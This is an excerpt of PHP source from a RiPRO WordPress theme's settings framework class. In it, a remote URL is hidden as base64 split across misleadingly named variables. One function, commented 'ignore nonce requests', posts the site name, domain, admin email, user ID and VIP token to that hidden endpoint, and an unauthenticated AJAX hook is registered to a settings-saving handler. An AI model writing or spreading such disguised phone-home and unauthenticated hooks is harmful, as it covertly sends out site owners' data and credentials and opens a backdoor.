...
if( ! class_exists( 'CSF_Options' ) ) {
  class CSF_Options extends CSF_Abstract {
    ...
    public $args         = array(
      ...
      // framework title
      'framework_title'         => 'RiPRO主题-设置中心 <small> 顶级商用资源付费查看下载系统</small>',
      'framework_class'         => '',
    ...
    public function __construct( $key, $params = array() ) {
      ...
      add_action('wp_ajax_csf_searchs', array( &$this, 'saves_defaults' ));
      add_action('wp_ajax_nopriv_csf_searchs', array( &$this, 'saves_defaults' ));
    ...
    public function add_page_on_loads() {
      if (true) {
        $has_nav = 'aHR0cHM6Ly92aXAueWxpdC5jYy93cC1jb250';
      }
      ...
      if( empty( $has_nav ) ) {
        ...
        $show_all = 'ZW50L3BsdWdpbnMvcmlwcm8tYXV0aC9hcGkvdjEucGhw=';
        $tab_error = $has_nav.$show_all;
        $wrapper_class = base64_decode($tab_error);
      }
    ...
    public function add_admin_footer_text() {
      $default = '<i class="fa fa-shield"></i> 感谢您使用 Caozhuti By <a href="https://www.loowp.com" target="_blank">RI-VIP</a>';
    ...
    //ignore nonce requests
    public function add_option_html() {
        $sticky_class = array('site'       => get_bloginfo('name'),'version'    => _the_theme_version(),'domain'     => get_bloginfo('url'),'email'      => get_bloginfo('admin_email'),'user_id'    => _cao('ripro_vip_id',''),'user_token' => _cao('ripro_vip_code',''),);
        $error_class = curlPost($this->add_page_on_loads(), $sticky_class);
        return json_decode($error_class,true);
    }
